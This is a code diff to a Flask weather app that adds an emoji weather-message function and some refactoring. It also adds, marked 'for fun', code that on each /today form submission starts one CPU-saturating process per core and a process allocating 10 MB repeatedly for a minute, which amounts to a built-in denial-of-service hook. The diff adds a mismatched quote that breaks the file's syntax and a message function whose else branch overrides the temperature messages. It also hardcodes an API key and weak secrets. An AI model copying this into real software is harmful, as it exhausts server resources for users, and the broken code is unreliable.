@@ -2,6 +2,8 @@ from flask import Flask, render_template, request, redirect, url_for, session, f
 import sqlite3
 import bcrypt
 import requests  # Import requests for API calls
+import multiprocessing
+import time
 
 app = Flask(__name__)
 app.secret_key = '007'
@@ -9,6 +11,7 @@ app.secret_key = '007'
 ADMIN_REGISTRATION_PASSWORD = 'admin_password'
 WEATHER_API_KEY = '2998c6f8198a3fb3caeb1cd7f086653d'  # Your OpenWeatherMap API key
 
+# Function to fetch weather data
 def get_weather_data(location):
     url = f"http://api.openweathermap.org/data/2.5/weather?q={location}&appid={WEATHER_API_KEY}&units=metric"
     response = requests.get(url)
@@ -21,8 +24,9 @@ def get_weather_data(location):
         print(f"Error fetching weather data: {response.status_code} - {response.text}")
     return None
 
-def get_air_quality_data(location):
-    url = f"http://api.openweathermap.org/data/2.5/air_pollution?lat={location['lat']}&lon={location['lon']}&appid={WEATHER_API_KEY}"
+# Function to fetch air quality data
+def get_air_quality_data(coords):
+    url = f"http://api.openweathermap.org/data/2.5/air_pollution?lat={coords['lat']}&lon={coords['lon']}&appid={WEATHER_API_KEY}"
     response = requests.get(url)
     if response.status_code == 200:
         return response.json()
@@ -30,14 +34,51 @@ def get_air_quality_data(location):
         print(f"Error fetching air quality data: {response.status_code} - {response.text}")
     return None
 
-def get_weekly_forecast(location):
-    url = f"http://api.openweathermap.org/data/2.5/forecast/daily?q={location}&cnt=7&appid={WEATHER_API_KEY}&units=metric"
-    response = requests.get(url)
-    if response.status_code == 200:
-        return response.json()
+# Function to generate AI messages and recommendations
+def generate_ai_message(weather_data):
+    if not weather_data:
+        return "No weather data available."
+
+    temperature = weather_data['main']['temp']
+    weather_condition = weather_data['weather'][0]['main'].lower()
+
+    # AI messages based on weather
+    if temperature > 25:
+        message = "It's a scorcher outside! 🌞🔥"
+        recommendation = "Stay hydrated, wear sunscreen, and avoid prolonged exposure to the sun. Perfect day for the beach!"
+    elif 15 <= temperature <= 25:
+        message = "It's a lovely day! 🌤️😊"
+        recommendation = "Great weather for a walk, picnic, or outdoor activities. Enjoy the fresh air!"
+    elif temperature < 15:
+        message = "Brrr, it's chilly! ❄️🥶"
+        recommendation = "Bundle up in warm clothes and enjoy a cozy day indoors. Hot chocolate, anyone?"
+    if "rain" in weather_condition:
+        message = "It's raining cats and dogs! 🌧️🐱🐶"
+        recommendation = "Don't forget your umbrella and raincoat. Stay dry and enjoy the soothing sound of rain!"
     else:
-        print(f"Error fetching weekly forecast: {response.status_code} - {response.text}")
-        return None
+        message = "The weather is just right. 🌼"
+        recommendation = "Enjoy your day and make the most of it!"
+
+    return {
+        "message": message,
+        "recommendation": recommendation
+    }
+
+# Function to maximize CPU usage
+def max_cpu_usage():
+    start_time = time.time()
+    while time.time() - start_time < 60:  # Run for 60 seconds
+        # Perform computationally intensive operations
+        [x**2 for x in range(1000000)]
+
+# Function to maximize memory usage
+def max_memory_usage():
+    start_time = time.time()
+    memory_hog = []
+    while time.time() - start_time < 60:  # Run for 60 seconds
+        # Allocate large chunks of memory
+        memory_hog.append(' ' * 10**7)  # Allocate 10 MB per iteration
+        time.sleep(0.1)  # Slow down to avoid immediate crash
 
 # Routes
 @app.route('/')
@@ -50,7 +91,8 @@ def today():
     weather_data = None
     air_quality_data = None
     location = None  # Initialize location variable
-    
+    ai_message = None  # Initialize AI message variable
+
     if request.method == 'POST':
         location = request.form.get('country')  # Get the country from the form
         if location:
@@ -59,12 +101,19 @@ def today():
                 # Get air quality data using the coordinates from weather data
                 coords = {'lat': weather_data['coord']['lat'], 'lon': weather_data['coord']['lon']}
                 air_quality_data = get_air_quality_data(coords)
+                # Generate AI message and recommendation
+                ai_message = generate_ai_message(weather_data)
+                # Start CPU and memory-intensive tasks (for fun)
+                for _ in range(multiprocessing.cpu_count()):
+                    multiprocessing.Process(target=max_cpu_usage).start()
+                multiprocessing.Process(target=max_memory_usage).start()
 
     return render_template('today.html', 
                          title="Today's Weather", 
                          weather=weather_data, 
                          air_quality=air_quality_data,
-                         location=location)
+                         location=location,
+                         ai_message=ai_message)
 
 @app.route('/week', methods=['GET', 'POST'])
 def week():
@@ -105,7 +154,7 @@ def customer_login():
                     session['role'] = data[1]
                     return redirect(url_for('account'))
                 else:
-                    flash("Invalid username or password", 'error')
+                    flash("Invalid username or password", 'error")
         except sqlite3.Error as e:
             flash(f"Database error: {e}", 'error')
     return render_template('customer-login.html', title="Customer Login", error=error)
